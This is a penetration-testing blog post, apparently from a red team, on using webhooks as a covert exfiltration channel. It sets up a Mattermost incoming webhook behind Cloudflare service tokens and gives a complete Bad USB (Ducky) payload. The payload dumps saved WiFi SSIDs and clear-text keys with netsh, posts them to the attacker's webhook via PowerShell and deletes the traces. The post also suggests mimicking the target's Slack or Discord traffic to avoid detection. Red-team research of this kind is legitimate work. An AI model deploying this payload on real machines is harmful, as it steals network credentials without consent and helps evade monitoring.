---
title: "Red Pandas Unleashed: How Webhooks, Bad USB, and WiFi Collide in Cyberspace"
date: 2023-10-06T20:18:54-04:00
draft: true # Set 'false' to publish
description: "Webhooks as a means of data exfiltration"
categories:
- Bad USB
tags:
- Techniques
- WiFi
- Webhooks
---

As dedicated penetration testers working for the AERMORed Team Pandas, we must understand the ever-evolving landscape of 
cybersecurity threats and recognize the importance of showing our clients how to stay one step ahead of malicious actors. 

In our line of work, efficiency and effectiveness are paramount, and one tool that has gained significant traction in recent years 
to accomplish this task are webhooks. 

In this blog post, we'll delve into the usefulness of webhooks for pentesting and explore how they can be employed
to emulate adversaries, including the ominous threat of USB exfiltration via webhooks to legitimate web applications.

### Understanding Webhooks

Before we dive into the intricacies of webhooks for pentesting, let's establish a fundamental understanding of what 
webhooks are: 

Webhooks are automated callbacks or HTTP requests triggered by specific events in an application or on a
server. They are designed to notify external systems or services about these events, making them a crucial part of 
automation and integration.

### The Power of Automation for Pentesting

Automation has become a game-changer in the world of penetration testing. With the ever-increasing complexity of networks
and systems, manually tracking and responding to security events is no longer viable. This is where webhooks come into 
play for cybersecurity professionals, and where we as pentesters can abuse the implicit trust of these automated actions.

#### Real-Time Alerting

Webhooks allow network administrators and cybersecurity professionals to receive real-time alerts when activities occur 
in their systems. For instance, administrators can set up webhooks to notify personnel when a server experiences a high 
number of failed login attempts or when an unauthorized user tries to access a critical system. Likewise, webhooks can be
configured to send notifications for less critical events, such as when an end-user submits a trouble ticket. This enables 
administrators to respond promptly to events, minimizing potential damage or ensuring user satisfaction.

Because of their prevalence, penetration testers can use these communication channels to fly under-the-radar and conduct
command and control communications or exfiltrate data to benign-looking webhook endpoints.

#### Automated Attack Simulation

One of the most exciting applications of webhooks in pentesting is automated attack simulation. By integrating webhooks 
with attack frameworks, we can orchestrate complex attacks, monitor their progress, and receive alerts when specific 
milestones are reached, such as successful exploitation of a target. 

While helpful to the pentesting process, this is the topic for a future blog post. 

### Tackling USB Exfiltration with Webhooks

Now, let's address the intriguing topic of USB exfiltration via webhooks. 

Malicious actors often employ USB devices to extract sensitive information or compromise systems for initial access. 
Webhooks allow us as pentesters to exfiltrate sensitive data in covert ways that are more difficult to detect by abusing
the trust that organizations have with their webhook endpoints. We Pandafied this a little bit and made a bad USB script
to dump WiFi SSIDs and PSKs and then send the dumped credentials back to a privately hosted Mattermost server via Mattermost's 
incoming webhook feature[^1] and Cloudflare tunnel service authentication.[^2]

#### Incoming webhook in Mattermost

Let's start with creating an incoming webhook in Mattermost to receive the data we plan to exfiltrate:

We first login to the Mattermost web interface, and navigate to the system console from the menu button in the top left
of the page.

{{< img src="mm_1.png" alt="Mattermost menu" size-method="Fit" size-format="600x400 webp" position="center" >}}

In the system console, search for the term "webhooks" and ensure that incoming webhooks are enabled.

{{< img src="mm_2.png" alt="Webhooks in the system console" size-method="Fit" size-format="1200x500 webp" position="center" >}}

After this, we return to the Mattermost application, select "Integrations" from the menu button in the top left, 
select "Incoming Webhooks", and finally select the "Add Incoming Webhook" button in the top right. We are presented with 
the following:

{{< img src="mm_3.png" alt="Webhook creation screen" size-method="Fit" size-format="1200x1000 webp" position="center" >}}

We fill in the information required and hit the "Save" button.

After doing this we are presented with the webhook url that we will use later on in the bad USB script.

> In this example we are using Mattermost for our data exfil, in an actual engagement research should be conducted to see
what applications the target is using in an attempt to blend in. Popular messaging apps like Slack and Discord both support
incoming webhooks and may blend in better to normal network traffic.

#### Cloudflare Zero Trust Service Authentication

To create the service authentication tokens we need for this incoming webhook to connect back to our self-hosted 
Mattermost instance, we first log into our Cloudflare Zero Trust dashboard and select Access > Service Auth. After that,
select "+ Create Service Token".

Fill in the name and select a duration for the token and click "Generate token"

{{< img src="cf_1.png" alt="Service token creation screen" size-method="Fit" size-format="800x600 webp" position="center" >}}

We can see the client ID and client secret that we need for our bad USB script. Make a note of both for later and click
"Save".

The last thing to do for Cloudflare is to navigate to our Mattermost application configuration and add the newly created
service auth token to its policy. Once in the application policy view, select "+ Add a policy".

Fill in the name of the policy, and select "Service Auth" for the action. In the "Create additional rules" section, select
"Service Token" for the selector and the name of the service token for the "Value".

{{< img src="cf_2.png" alt="Mattermost application policy creation" size-method="Fit" size-format="1200x1000 webp" position="center" >}}

#### Bad USB

We now have everything we need to configure the bad USB payload! The payload is shown below:

```BadUSBscript
REM Title: wifi-exfil
 REM Author: AERMORed Team Pandas
 REM Description: Extracts the SSID and WiFi PSKs to xml files and send them to a Mattermost webhook endpoint.
 REM_BLOCK Usage:
     ...
 END_REM
 
 GUI r
 DELAY 2000
 STRING powershell
 ENTER
 DELAY 2000
 STRING $webhookUri = '<value>' (Mattermost webhook URL from earlier)
 ENTER
 STRING $guid = [guid]::NewGuid().ToString()
 ENTER
 STRING New-Item -Path $env:temp -Name $guid -ItemType "directory"
 ENTER
 STRING Set-Location -Path "$env:temp/$guid"
 ENTER
 STRING netsh wlan export profile key=clear;
 ENTER
 STRING Set-Location -Path $env:temp
 ENTER
 STRING $headers = @{
 STRING 'CF-Access-Client-Id' = '<value>' (Cloudflare Client ID from earlier)
 ENTER
 STRING 'CF-Access-Client-Secret' = '<value>' (Cloudflare Client Secret from earlier)
 ENTER
 STRING 'Content-Type' = 'application/json'}
 ENTER
 STRING Get-ChildItem "$env:tmp/$guid" -File |
 ENTER
 STRING ForEach-Object {
 ENTER
 STRING $fileContent = Get-Content $_.FullName | Out-String
 ENTER
 STRING $Body = @{
 ENTER
 STRING 'text' = '```xml'  + "`n" + $fileContent + '```'
 ENTER
 STRING }
 ENTER
 STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Headers $headers -Body (ConvertTo-Json -InputObject $Body)
 ENTER
 STRING Start-Sleep -Milliseconds 300
 STRING }
 ENTER
 STRING Remove-Item -Path "$env:tmp/$guid" -Force -Recurse
 ENTER
 STRING exit
 ENTER
```

For those unfamiliar with bad USB scripts, a quick legend below:
- REM - used for commenting in script
- GUI - is the windows key
- DELAY - Time before entering next command
- STRING - keyboard strokes to type
- ENTER = Enter key on keyboard
> Additional documentation for Bad USB/ducky syntax can be found on Hak5's website[^3]

With this script we run Powershell, set a variable to the webhook endpoint we previously created, and create a unique
location to dump credentials to via Powershell's GUID functions. The string representation of the GUID is stored in a 
variable for later use.

After this, we create a directory in `$env:temp` with the name being the GUID we just created, and change directories to
this new location. We then politely ask the OS to dump all of its saved WiFi connection profiles with clear-text PSKs to
this location as `.xml` files, which it obliges to without batting an eye.

We then move up one directory, to `$env:temp` and begin constructing the required HTTP headers for our impending exfil.

We need the `CF-Access-Client-Id` and `CF-Access-Client-Secret` to be sent with each request to our Mattermost instance 
so that it can pass through the Cloudflare tunnel successfully, and additionally Mattermost needs each incoming webhook
to be JSON formatted which we set with the `Content-Type` header.

With the proper headers configured, we can begin the data exfiltration:

We first get a list of the contents of our directory, and for each file in this directory we read its contents into the `$fileContents`
variable as string data. After this, we construct the body of our HTTP request using the `$fileContents` variable. Finally,
we can send this to our Mattermost server using `Invoke-RestMethod` and then waiting a small amount before moving on to the
next file.

We should see the files we asked for start populating in the Mattermost channel we configured earlier!

{{< img src="mm_4.png" alt="Successful data exfil via webhooks" size-method="Fit" size-format="1200x1000 webp" position="center" >}}

Awesome!

The last thing we need to do is clean up the temp directory which we do by not so politely telling the OS to 
recursively force delete the directory we created earlier. 

## Conclusion

As PSK have become more complex and more time consuming to crack, bad USB scripts have created a more expedient way to 
gain WiFi Access.

Webhooks have ushered in a new era in the realm of cybersecurity, fundamentally transforming the way we 
approach and tackle threats. Their automation capabilities are a force multiplier, elevating efficiency, precision, and 
response times to unprecedented levels. However, with great power comes great responsibility.

As Pentesters, it is not enough to merely harness the potential of webhooks; we must also take on the role of guardians,
both in researching and securing this invaluable capability. In an environment where threats constantly evolve and 
adapt, staying ahead of the curve is imperative.

Webhooks are critical to the modern digital world as they allow many important technologies to communicate seamlessly 
with each other programatically. Knowing this, as Pentesters it is important for us to attempt to abuse them to show 
why client organizations need to secure outgoing communications to well-known web applications.

Let us embrace the transformative power of automation: it equips us to confront the ever-evolving challenges of 
the cybersecurity landscape with resilience, agility, and unwavering dedication to our mission of safeguarding the 
digital realm. With webhooks as our ally, we are not just Pentesters; we are the vanguards of a safer cyber world.

---

Our bad USB script repository can be found on our [Github](https://github.com/aermored/ducky-scripts). As we create
additional payloads, they will be uploaded there.

[^1]: https://developers.mattermost.com/integrate/webhooks/incoming/
[^2]: https://developers.cloudflare.com/cloudflare-one/identity/service-tokens/
[^3]: https://docs.hak5.org/hak5-usb-rubber-ducky/